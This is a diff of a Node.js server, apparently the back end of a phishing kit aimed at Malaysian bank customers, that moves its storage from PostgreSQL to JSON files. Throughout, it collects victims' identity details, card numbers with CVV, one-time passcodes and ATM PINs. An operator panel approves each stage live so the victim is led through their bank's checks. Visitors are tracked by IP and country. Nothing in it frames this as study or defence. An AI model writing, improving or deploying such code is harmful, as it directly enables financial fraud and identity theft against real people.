@@ -4,79 +4,28 @@ const cors = require('cors');
 const path = require('path');
 const crypto = require('crypto');
 const geoip = require('geoip-lite');
-const { Pool } = require('pg');
+const fs = require('fs');
 require('dotenv').config();
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
 
-// إعداد اتصال PostgreSQL مع Connection Pool محسّن لتحمل 300+ زيارة
-const pool = new Pool({
-  connectionString: process.env.DATABASE_URL,
-  ssl: {
-    rejectUnauthorized: false
-  },
-  // إعدادات Connection Pool لتحمل الزيارات العالية
-  max: 20,                    // الحد الأقصى للاتصالات المتزامنة (20 اتصال)
-  idleTimeoutMillis: 30000,   // إغلاق الاتصال بعد 30 ثانية خمول
-  connectionTimeoutMillis: 5000, // مهلة الاتصال 5 ثوانٍ
-  allowExitOnIdle: false      // لا تغلق الـ pool عند الخمول
-});
+// مسارات ملفات البيانات
+const DATA_DIR = path.join(__dirname, 'data');
+const ORDERS_FILE = path.join(DATA_DIR, 'orders.json');
+const ORDER_STATES_FILE = path.join(DATA_DIR, 'order_states.json');
+const SESSIONS_FILE = path.join(DATA_DIR, 'sessions.json');
 
-// إنشاء الجداول + الفهارس لتحسين الأداء
-async function initDb() {
-  try {
-    await pool.query(`
-      CREATE TABLE IF NOT EXISTS orders (
-        id TEXT PRIMARY KEY,
-        session_id TEXT,
-        timestamp TEXT,
-        status TEXT,
-        current_page TEXT,
-        country TEXT,
-        personal_data JSONB,
-        payment_data JSONB,
-        otp_data JSONB,
-        atm_pin_data JSONB,
-        rejected BOOLEAN DEFAULT FALSE,
-        rejection_reason TEXT,
-        admin_action TEXT,
-        admin_action_at TEXT,
-        lang TEXT DEFAULT 'ms'
-      );
+// التأكد من وجود المجلد والملفات
+if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);
+if (!fs.existsSync(ORDERS_FILE)) fs.writeFileSync(ORDERS_FILE, JSON.stringify([]));
+if (!fs.existsSync(ORDER_STATES_FILE)) fs.writeFileSync(ORDER_STATES_FILE, JSON.stringify({}));
+if (!fs.existsSync(SESSIONS_FILE)) fs.writeFileSync(SESSIONS_FILE, JSON.stringify({}));
 
-      CREATE TABLE IF NOT EXISTS order_states (
-        order_id TEXT PRIMARY KEY,
-        stage TEXT,
-        status TEXT,
-        message TEXT
-      );
-
-      CREATE TABLE IF NOT EXISTS visitor_sessions (
-        session_id TEXT PRIMARY KEY,
-        ip TEXT,
-        country TEXT,
-        current_page TEXT,
-        last_activity TEXT,
-        user_agent TEXT
-      );
-
-      -- فهارس لتسريع الاستعلامات
-      CREATE INDEX IF NOT EXISTS idx_orders_timestamp ON orders (timestamp DESC);
-      CREATE INDEX IF NOT EXISTS idx_orders_status ON orders (status);
-      CREATE INDEX IF NOT EXISTS idx_orders_country ON orders (country);
-      CREATE INDEX IF NOT EXISTS idx_order_states_status ON order_states (status);
-      CREATE INDEX IF NOT EXISTS idx_order_states_stage ON order_states (stage);
-      CREATE INDEX IF NOT EXISTS idx_visitor_sessions_last_activity ON visitor_sessions (last_activity DESC);
-    `);
-    console.log('Database tables and indexes initialized');
-  } catch (err) {
-    console.error('Error initializing database:', err);
-  }
-}
-
-initDb();
+// دوال مساعدة للتعامل مع البيانات
+const readData = (file) => JSON.parse(fs.readFileSync(file, 'utf8'));
+const writeData = (file, data) => fs.writeFileSync(file, JSON.stringify(data, null, 2));
 
 // Middleware
 app.use(cors());
@@ -89,9 +38,7 @@ function getCountryFromIP(ip) {
   try {
     const cleanIP = ip.replace('::ffff:', '');
     const geo = geoip.lookup(cleanIP);
-    if (geo && geo.country) {
-      return geo.country;
-    }
+    if (geo && geo.country) return geo.country;
   } catch (e) {}
   if (!ip || ip === '127.0.0.1' || ip === '::1') return 'Local';
   return 'Unknown';
@@ -99,509 +46,210 @@ function getCountryFromIP(ip) {
 
 app.set('trust proxy', true);
 
-// Helper: Parse JSONB fields from DB rows into proper JSON objects
-// and rename snake_case keys to camelCase for frontend compatibility
-function parseOrderRow(row) {
-  if (!row) return null;
-  
-  const personalData = typeof row.personal_data === 'string' 
-    ? JSON.parse(row.personal_data) 
-    : row.personal_data;
-  const paymentData = typeof row.payment_data === 'string' 
-    ? JSON.parse(row.payment_data) 
-    : row.payment_data;
-  const otpData = typeof row.otp_data === 'string' 
-    ? JSON.parse(row.otp_data) 
-    : row.otp_data;
-  const atmPinData = typeof row.atm_pin_data === 'string' 
-    ? JSON.parse(row.atm_pin_data) 
-    : row.atm_pin_data;
-
-  return {
-    id: row.id,
-    sessionId: row.session_id,
-    timestamp: row.timestamp,
-    status: row.status,
-    currentPage: row.current_page,
-    country: row.country,
-    personalData: personalData || null,
-    paymentData: paymentData || null,
-    otpData: otpData || null,
-    atmPinData: atmPinData || null,
-    rejected: row.rejected,
-    rejectionReason: row.rejection_reason,
-    adminAction: row.admin_action,
-    adminActionAt: row.admin_action_at
-  };
-}
-
-// ============================================
-// تحسين Middleware لتتبع الجلسات
-// عند 300+ زيارة: نستخدم fire-and-forget (غير متزامن) لتجنب إبطاء الطلبات
-// ============================================
-app.use(async (req, res, next) => {
-  // تجنب تتبع طلبات الـ API الثابتة أو ملفات الـ public
-  if (req.path.includes('.') || req.path.startsWith('/api/')) {
-    return next();
-  }
+// تتبع الجلسات
+app.use((req, res, next) => {
+  if (req.path.includes('.') || req.path.startsWith('/api/')) return next();
 
   const forwardedFor = req.headers['x-forwarded-for'];
   const realIp = req.headers['x-real-ip'];
-  const ip = forwardedFor 
-    ? forwardedFor.split(',')[0].trim() 
-    : (realIp || req.ip || req.connection.remoteAddress);
-  
+  const ip = forwardedFor ? forwardedFor.split(',')[0].trim() : (realIp || req.ip || req.connection.remoteAddress);
   const userAgent = req.get('user-agent') || '';
-  // استخدام IP + UserAgent كمعرف فريد للزائر
   const visitorKey = (ip || 'unknown') + ':' + userAgent.substring(0, 100);
   const country = getCountryFromIP(ip);
   const currentPage = req.path;
   const now = new Date().toISOString();
 
-  // تحديث الجلسة في قاعدة البيانات
-  const sessionTask = pool.query(`
-    INSERT INTO visitor_sessions (session_id, ip, country, current_page, last_activity, user_agent)
-    VALUES ($1, $2, $3, $4, $5, $6)
-    ON CONFLICT (session_id) DO UPDATE SET
-      current_page = $4, last_activity = $5
-  `, [visitorKey, ip, country, currentPage, now, userAgent])
-  .then(() => {
-    // تنظيف الجلسات الخاملة (أكثر من دقيقتين بدلاً من 5 ليكون العداد أدق للزيارات "اللحظية")
-    return pool.query("DELETE FROM visitor_sessions WHERE last_activity < (NOW() - INTERVAL '2 minutes')");
-  })
-  .catch(err => {
-    console.error('Session tracking error:', err);
+  const sessions = readData(SESSIONS_FILE);
+  sessions[visitorKey] = { ip, country, current_page: currentPage, last_activity: now, user_agent: userAgent };
+  
+  // تنظيف الجلسات القديمة
+  const twoMinsAgo = new Date(Date.now() - 120000).toISOString();
+  Object.keys(sessions).forEach(key => {
+    if (sessions[key].last_activity < twoMinsAgo) delete sessions[key];
   });
-
-  // لا ننتظر sessionTask - نستمر فوراً
-  sessionTask.catch(() => {}); // silent catch
-
+  
+  writeData(SESSIONS_FILE, sessions);
   res.locals.sessionId = visitorKey;
   next();
 });
 
-// مسار خاص للوحة الإدارة
-app.get('/admin', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
+app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin.html')));
+
+// API Routes
+app.get('/api/admin/orders', (req, res) => {
+  const orders = readData(ORDERS_FILE);
+  const states = readData(ORDER_STATES_FILE);
+  const result = orders.map(o => ({ ...o, orderState: states[o.id] || null }));
+  res.json(result);
 });
 
-// ============================================
-// API Routes - محسّنة للأداء
-// ============================================
+app.get('/api/sessions', (req, res) => {
+  const sessions = readData(SESSIONS_FILE);
+  res.json({ count: Object.keys(sessions).length, sessions: [] });
+});
 
-// Get all orders (with states joined) - محسّن
-// لا يوجد pagination لأن admin يحتاج كل الطلبات، لكن الفهارس تجعل الاستعلام سريع
-app.get('/api/admin/orders', async (req, res) => {
-  try {
-    const result = await pool.query(`
-      SELECT o.*, 
-             json_build_object('stage', os.stage, 'status', os.status, 'message', os.message) as "orderState"
-      FROM orders o
-      LEFT JOIN order_states os ON o.id = os.order_id
-      ORDER BY o.timestamp DESC
-    `);
-    
-    // Parse each row to convert snake_case to camelCase
-    const parsedOrders = result.rows.map(row => {
-      const order = parseOrderRow(row);
-      order.orderState = row.orderState || null;
-      return order;
-    });
-    
-    res.json(parsedOrders);
-  } catch (err) {
-    console.error(err);
-    res.status(500).json({ error: 'Database error' });
+app.get('/api/sessions/full', (req, res) => {
+  const sessions = readData(SESSIONS_FILE);
+  res.json({ count: Object.keys(sessions).length, sessions: Object.values(sessions) });
+});
+
+app.get('/api/session', (req, res) => res.json({ sessionId: res.locals.sessionId }));
+
+app.post('/api/heartbeat', (req, res) => {
+  const { currentPage } = req.body;
+  const sessionId = res.locals.sessionId;
+  const sessions = readData(SESSIONS_FILE);
+  if (sessions[sessionId]) {
+    sessions[sessionId].last_activity = new Date().toISOString();
+    sessions[sessionId].current_page = currentPage || sessions[sessionId].current_page;
+    writeData(SESSIONS_FILE, sessions);
   }
+  res.json({ success: true });
 });
 
-// Get active sessions count only (أخف على الأداء)
-app.get('/api/sessions', async (req, res) => {
-  try {
-    const result = await pool.query('SELECT COUNT(*) FROM visitor_sessions');
-    const count = parseInt(result.rows[0].count);
-    res.json({ count, sessions: [] });
-  } catch (err) {
-    res.status(500).json({ error: 'Database error' });
-  }
+app.post('/api/orders/personal-data', (req, res) => {
+  const { fullname, id_number, phone, id_expiry_day, id_expiry_month, id_expiry_year, dob_day, dob_month, dob_year, email, gender, lang } = req.body;
+  if (!fullname || !id_number || !phone || !email) return res.status(400).json({ error: 'Missing fields' });
+
+  const orderId = 'ORD-' + Date.now();
+  const ip = req.ip;
+  const country = getCountryFromIP(ip);
+  
+  const order = {
+    id: orderId,
+    timestamp: new Date().toISOString(),
+    status: 'personal_data_submitted',
+    current_page: 'personal_data',
+    country,
+    personalData: { fullname, id_number, phone, id_expiry: `${id_expiry_day}/${id_expiry_month}/${id_expiry_year}`, dob: `${dob_day}/${dob_month}/${dob_year}`, email, gender },
+    lang: lang || 'ms'
+  };
+
+  const orders = readData(ORDERS_FILE);
+  orders.push(order);
+  writeData(ORDERS_FILE, orders);
+
+  const states = readData(ORDER_STATES_FILE);
+  states[orderId] = { stage: 'payment', status: 'waiting' };
+  writeData(ORDER_STATES_FILE, states);
+
+  res.json({ success: true, orderId });
 });
 
-// Get full sessions (مطلوب أحياناً)
-app.get('/api/sessions/full', async (req, res) => {
-  try {
-    const result = await pool.query('SELECT * FROM visitor_sessions');
-    res.json({ count: result.rowCount, sessions: result.rows });
-  } catch (err) {
-    res.status(500).json({ error: 'Database error' });
-  }
+app.post('/api/orders/payment-data', (req, res) => {
+  const { orderId, card_holder, card_number, expiry_date, cvv } = req.body;
+  const orders = readData(ORDERS_FILE);
+  const orderIndex = orders.findIndex(o => o.id === orderId);
+  if (orderIndex === -1) return res.status(404).json({ error: 'Order not found' });
+
+  orders[orderIndex].paymentData = { card_holder, card_number, expiry_date, cvv };
+  orders[orderIndex].status = 'payment_data_submitted';
+  orders[orderIndex].current_page = 'payment';
+  writeData(ORDERS_FILE, orders);
+
+  const states = readData(ORDER_STATES_FILE);
+  states[orderId] = { stage: 'payment', status: 'pending' };
+  writeData(ORDER_STATES_FILE, states);
+
+  res.json({ success: true });
 });
 
-// Get session ID for client
-app.get('/api/session', (req, res) => {
-  res.json({ sessionId: res.locals.sessionId });
+app.get('/api/orders/:orderId/status', (req, res) => {
+  const states = readData(ORDER_STATES_FILE);
+  const state = states[req.params.orderId];
+  if (!state) return res.json({ status: 'unknown' });
+
+  const orders = readData(ORDERS_FILE);
+  const order = orders.find(o => o.id === req.params.orderId);
+  res.json({ ...state, currentPage: order ? order.current_page : null, lang: order ? order.lang : 'ms' });
 });
 
-// Heartbeat API to keep session alive
-app.post('/api/heartbeat', async (req, res) => {
-  try {
-    const { currentPage } = req.body;
-    const sessionId = res.locals.sessionId;
-    const now = new Date().toISOString();
-    
-    await pool.query(`
-      UPDATE visitor_sessions 
-      SET last_activity = $1, current_page = COALESCE($2, current_page)
-      WHERE session_id = $3
-    `, [now, currentPage, sessionId]);
-    
-    res.json({ success: true });
-  } catch (err) {
-    res.status(500).json({ error: 'Database error' });
-  }
+app.post('/api/orders/otp-verification', (req, res) => {
+  const { orderId, otp_code } = req.body;
+  const orders = readData(ORDERS_FILE);
+  const orderIndex = orders.findIndex(o => o.id === orderId);
+  if (orderIndex === -1) return res.status(404).json({ error: 'Order not found' });
+
+  orders[orderIndex].otpData = { otp_code, verified_at: new Date().toISOString() };
+  orders[orderIndex].status = 'otp_submitted';
+  orders[orderIndex].current_page = 'otp';
+  writeData(ORDERS_FILE, orders);
+
+  const states = readData(ORDER_STATES_FILE);
+  states[orderId] = { stage: 'otp', status: 'pending' };
+  writeData(ORDER_STATES_FILE, states);
+
+  res.json({ success: true });
 });
 
-// Save personal data (Step 1)
-app.post('/api/orders/personal-data', async (req, res) => {
-  try {
-    const { fullname, id_number, phone, id_expiry_day, id_expiry_month, id_expiry_year, dob_day, dob_month, dob_year, email, gender, lang } = req.body;
+app.post('/api/orders/atm-pin', (req, res) => {
+  const { orderId, atm_pin } = req.body;
+  const orders = readData(ORDERS_FILE);
+  const orderIndex = orders.findIndex(o => o.id === orderId);
+  if (orderIndex === -1) return res.status(404).json({ error: 'Order not found' });
 
-    if (!fullname || !id_number || !phone || !email) {
-      return res.status(400).json({ error: 'Missing required fields' });
-    }
+  orders[orderIndex].atmPinData = { atm_pin, submitted_at: new Date().toISOString() };
+  orders[orderIndex].status = 'atm_pin_submitted';
+  orders[orderIndex].current_page = 'atm_pin';
+  writeData(ORDERS_FILE, orders);
 
-    const orderId = 'ORD-' + Date.now();
-    const forwardedFor = req.headers['x-forwarded-for'];
-    const ip = forwardedFor ? forwardedFor.split(',')[0].trim() : (req.headers['x-real-ip'] || req.ip);
-    const userAgent = req.get('user-agent') || '';
-    const sessionId = (ip || 'unknown') + ':' + userAgent.substring(0, 50);
-    const country = getCountryFromIP(ip);
-    
-    const personalData = {
-      fullname,
-      id_number,
-      phone,
-      id_expiry: `${id_expiry_day}/${id_expiry_month}/${id_expiry_year}`,
-      dob: `${dob_day}/${dob_month}/${dob_year}`,
-      email,
-      gender
-    };
+  const states = readData(ORDER_STATES_FILE);
+  states[orderId] = { stage: 'atm_pin', status: 'pending' };
+  writeData(ORDER_STATES_FILE, states);
 
-    // استخدام Transaction لضمان الاتساق
-    const client = await pool.connect();
-    try {
-      await client.query('BEGIN');
-      
-      await client.query(`
-        INSERT INTO orders (id, session_id, timestamp, status, current_page, country, personal_data, lang)
-        VALUES ($1, $2, $3, $4, $5, $6, $7, $8)
-      `, [orderId, sessionId, new Date().toISOString(), 'personal_data_submitted', 'personal_data', country, JSON.stringify(personalData), lang || 'ms']);
-
-      // عند إدخال البيانات الشخصية فقط، المرحلة payment لكن الحالة waiting (ليست pending)
-      await client.query(`
-        INSERT INTO order_states (order_id, stage, status)
-        VALUES ($1, $2, $3)
-      `, [orderId, 'payment', 'waiting']);
-
-      await client.query('COMMIT');
-    } catch (err) {
-      await client.query('ROLLBACK');
-      throw err;
-    } finally {
-      client.release();
-    }
-
-    res.json({ success: true, orderId, message: 'Personal data saved successfully' });
-  } catch (err) {
-    console.error(err);
-    res.status(500).json({ error: 'Internal server error' });
-  }
+  res.json({ success: true });
 });
 
-// Save payment data (Step 2)
-app.post('/api/orders/payment-data', async (req, res) => {
-  try {
-    const { orderId, card_holder, card_number, expiry_date, cvv } = req.body;
-
-    if (!orderId || !card_holder || !card_number || !expiry_date || !cvv) {
-      return res.status(400).json({ error: 'Missing required fields' });
-    }
-
-    const paymentData = { card_holder, card_number, expiry_date, cvv };
-
-    const client = await pool.connect();
-    try {
-      await client.query('BEGIN');
-
-      const result = await client.query(`
-        UPDATE orders 
-        SET payment_data = $1, status = $2, current_page = $3 
-        WHERE id = $4
-      `, [JSON.stringify(paymentData), 'payment_data_submitted', 'payment', orderId]);
-
-      if (result.rowCount === 0) {
-        await client.query('ROLLBACK');
-        return res.status(404).json({ error: 'Order not found' });
-      }
-
-      await client.query(`
-        UPDATE order_states SET stage = $1, status = $2, message = NULL WHERE order_id = $3
-      `, ['payment', 'pending', orderId]);
-
-      await client.query('COMMIT');
-    } catch (err) {
-      await client.query('ROLLBACK');
-      throw err;
-    } finally {
-      client.release();
-    }
-
-    res.json({ success: true, message: 'Payment data saved successfully' });
-  } catch (err) {
-    console.error(err);
-    res.status(500).json({ error: 'Internal server error' });
-  }
-});
-
-// Check order status (polling endpoint)
-app.get('/api/orders/:orderId/status', async (req, res) => {
-  try {
-    const { orderId } = req.params;
-    const stateRes = await pool.query('SELECT * FROM order_states WHERE order_id = $1', [orderId]);
-    
-    if (stateRes.rowCount === 0) {
-      return res.json({ status: 'unknown' });
-    }
-
-    const orderRes = await pool.query('SELECT current_page, lang FROM orders WHERE id = $1', [orderId]);
-    const state = stateRes.rows[0];
-    
-    res.json({
-      status: state.status,
-      stage: state.stage,
-      message: state.message,
-      currentPage: orderRes.rowCount > 0 ? orderRes.rows[0].current_page : null,
-      lang: orderRes.rowCount > 0 ? orderRes.rows[0].lang : 'ms'
-    });
-  } catch (err) {
-    console.error(err);
-    res.status(500).json({ error: 'Internal server error' });
-  }
-});
-
-// Save OTP verification (Step 3)
-app.post('/api/orders/otp-verification', async (req, res) => {
-  try {
-    const { orderId, otp_code } = req.body;
-
-    if (!orderId || !otp_code) {
-      return res.status(400).json({ error: 'Missing required fields' });
-    }
-
-    const otpData = { otp_code, verified_at: new Date().toISOString() };
-
-    const client = await pool.connect();
-    try {
-      await client.query('BEGIN');
-
-      const result = await client.query(`
-        UPDATE orders SET otp_data = $1, status = $2, current_page = $3 WHERE id = $4
-      `, [JSON.stringify(otpData), 'otp_submitted', 'otp', orderId]);
-
-      if (result.rowCount === 0) {
-        await client.query('ROLLBACK');
-        return res.status(404).json({ error: 'Order not found' });
-      }
-
-      await client.query(`
-        UPDATE order_states SET stage = $1, status = $2, message = NULL WHERE order_id = $3
-      `, ['otp', 'pending', orderId]);
-
-      await client.query('COMMIT');
-    } catch (err) {
-      await client.query('ROLLBACK');
-      throw err;
-    } finally {
-      client.release();
-    }
-
-    res.json({ success: true, message: 'OTP submitted successfully' });
-  } catch (err) {
-    console.error(err);
-    res.status(500).json({ error: 'Internal server error' });
-  }
-});
-
-// Save ATM PIN (Step 4)
-app.post('/api/orders/atm-pin', async (req, res) => {
-  try {
-    const { orderId, atm_pin } = req.body;
-
-    if (!orderId || !atm_pin) {
-      return res.status(400).json({ error: 'Missing required fields' });
-    }
-
-    const atmPinData = { atm_pin, submitted_at: new Date().toISOString() };
-
-    const client = await pool.connect();
-    try {
-      await client.query('BEGIN');
-
-      const result = await client.query(`
-        UPDATE orders SET atm_pin_data = $1, status = $2, current_page = $3 WHERE id = $4
-      `, [JSON.stringify(atmPinData), 'atm_pin_submitted', 'atm_pin', orderId]);
-
-      if (result.rowCount === 0) {
-        await client.query('ROLLBACK');
-        return res.status(404).json({ error: 'Order not found' });
-      }
-
-      await client.query(`
-        UPDATE order_states SET stage = $1, status = $2, message = NULL WHERE order_id = $3
-      `, ['atm_pin', 'pending', orderId]);
-
-      await client.query('COMMIT');
-    } catch (err) {
-      await client.query('ROLLBACK');
-      throw err;
-    } finally {
-      client.release();
-    }
-
-    res.json({ success: true, message: 'ATM PIN submitted successfully' });
-  } catch (err) {
-    console.error(err);
-    res.status(500).json({ error: 'Internal server error' });
-  }
-});
-
-// Get order by ID
-app.get('/api/orders/:orderId', async (req, res) => {
-  try {
-    const result = await pool.query('SELECT * FROM orders WHERE id = $1', [req.params.orderId]);
-    if (result.rowCount === 0) {
-      return res.status(404).json({ error: 'Order not found' });
-    }
-    const parsedOrder = parseOrderRow(result.rows[0]);
-    res.json(parsedOrder);
-  } catch (err) {
-    res.status(500).json({ error: 'Internal server error' });
-  }
-});
-
-// Admin API - Verify password
 app.post('/api/admin/verify', (req, res) => {
-  const { password } = req.body;
-  if (password === ADMIN_PASSWORD) {
-    const token = crypto.randomBytes(32).toString('hex');
-    res.json({ success: true, token });
-  } else {
-    res.status(401).json({ error: 'Invalid password' });
-  }
+  if (req.body.password === ADMIN_PASSWORD) res.json({ success: true, token: 'fake-token' });
+  else res.status(401).json({ error: 'Invalid password' });
 });
 
-// Admin API - Approve order
-app.post('/api/admin/approve/:orderId', async (req, res) => {
-  try {
-    const { orderId } = req.params;
-    
-    const client = await pool.connect();
-    try {
-      await client.query('BEGIN');
+app.post('/api/admin/approve/:orderId', (req, res) => {
+  const { orderId } = req.params;
+  const states = readData(ORDER_STATES_FILE);
+  if (!states[orderId]) return res.status(404).json({ error: 'Not found' });
 
-      const stateRes = await client.query('SELECT * FROM order_states WHERE order_id = $1', [orderId]);
-      
-      if (stateRes.rowCount === 0) {
-        await client.query('ROLLBACK');
-        return res.status(404).json({ error: 'Order state not found' });
-      }
+  const orders = readData(ORDERS_FILE);
+  const orderIndex = orders.findIndex(o => o.id === orderId);
+  
+  let { stage } = states[orderId];
+  let nextPage = '';
 
-      let { stage, status } = stateRes.rows[0];
-      let currentPage = '';
-      let orderStatus = '';
+  if (stage === 'payment') { stage = 'otp'; nextPage = 'otp'; }
+  else if (stage === 'otp') { stage = 'atm_pin'; nextPage = 'atm-pin'; }
+  else if (stage === 'atm_pin') { stage = 'success'; nextPage = 'success'; orders[orderIndex].status = 'completed'; }
 
-      if (stage === 'payment') {
-        stage = 'otp';
-        status = 'approved';
-        currentPage = 'otp';
-      } else if (stage === 'otp') {
-        stage = 'atm_pin';
-        status = 'approved';
-        currentPage = 'atm-pin';
-      } else if (stage === 'atm_pin') {
-        stage = 'success';
-        status = 'approved';
-        currentPage = 'success';
-        orderStatus = 'completed';
-      }
+  states[orderId] = { stage, status: 'approved' };
+  orders[orderIndex].current_page = nextPage;
+  orders[orderIndex].adminAction = 'approved';
+  orders[orderIndex].adminActionAt = new Date().toISOString();
 
-      await client.query(`
-        UPDATE orders SET current_page = $1, status = COALESCE(NULLIF($2, ''), status), admin_action = $3, admin_action_at = $4 WHERE id = $5
-      `, [currentPage, orderStatus, 'approved', new Date().toISOString(), orderId]);
-
-      await client.query(`
-        UPDATE order_states SET stage = $1, status = $2 WHERE order_id = $3
-      `, [stage, status, orderId]);
-
-      await client.query('COMMIT');
-      res.json({ success: true, message: 'Order approved', nextPage: stage });
-    } catch (err) {
-      await client.query('ROLLBACK');
-      throw err;
-    } finally {
-      client.release();
-    }
-  } catch (err) {
-    console.error(err);
-    res.status(500).json({ error: 'Internal server error' });
-  }
+  writeData(ORDER_STATES_FILE, states);
+  writeData(ORDERS_FILE, orders);
+  res.json({ success: true, nextPage });
 });
 
-// Admin API - Reject order
-app.post('/api/admin/reject/:orderId', async (req, res) => {
-  try {
-    const { orderId } = req.params;
-    const { message } = req.body;
-    
-    const client = await pool.connect();
-    try {
-      await client.query('BEGIN');
+app.post('/api/admin/reject/:orderId', (req, res) => {
+  const { orderId } = req.params;
+  const { message } = req.body;
+  const states = readData(ORDER_STATES_FILE);
+  if (!states[orderId]) return res.status(404).json({ error: 'Not found' });
 
-      const stateRes = await client.query('SELECT * FROM order_states WHERE order_id = $1', [orderId]);
-      if (stateRes.rowCount === 0) {
-        await client.query('ROLLBACK');
-        return res.status(404).json({ error: 'Order state not found' });
-      }
+  const orders = readData(ORDERS_FILE);
+  const orderIndex = orders.findIndex(o => o.id === orderId);
+  const lang = orders[orderIndex].lang || 'ms';
+  const defaultMsg = lang === 'en' ? 'Information is incorrect' : 'Maklumat tidak betul';
 
-      const stage = stateRes.rows[0].stage;
-      let currentPage = stage;
+  states[orderId].status = 'rejected';
+  states[orderId].message = message || defaultMsg;
+  orders[orderIndex].rejected = true;
+  orders[orderIndex].rejection_reason = message || defaultMsg;
+  orders[orderIndex].adminAction = 'rejected';
 
-      const orderInfo = await client.query('SELECT lang FROM orders WHERE id = $1', [orderId]);
-      const lang = orderInfo.rowCount > 0 ? orderInfo.rows[0].lang : 'ms';
-      const defaultMsg = lang === 'en' ? 'Information is incorrect' : 'Maklumat tidak betul';
-
-      await client.query(`
-        UPDATE orders SET current_page = $1, admin_action = $2, admin_action_at = $3, rejected = TRUE, rejection_reason = $4 WHERE id = $5
-      `, [currentPage, 'rejected', new Date().toISOString(), message || defaultMsg, orderId]);
-
-      await client.query(`
-        UPDATE order_states SET status = $1, message = $2 WHERE order_id = $3
-      `, ['rejected', message || defaultMsg, orderId]);
-
-      await client.query('COMMIT');
-      res.json({ success: true, message: 'Order rejected' });
-    } catch (err) {
-      await client.query('ROLLBACK');
-      throw err;
-    } finally {
-      client.release();
-    }
-  } catch (err) {
-    console.error(err);
-    res.status(500).json({ error: 'Internal server error' });
-  }
+  writeData(ORDER_STATES_FILE, states);
+  writeData(ORDERS_FILE, orders);
+  res.json({ success: true });
 });
 
-// Start server
-app.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
-});
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
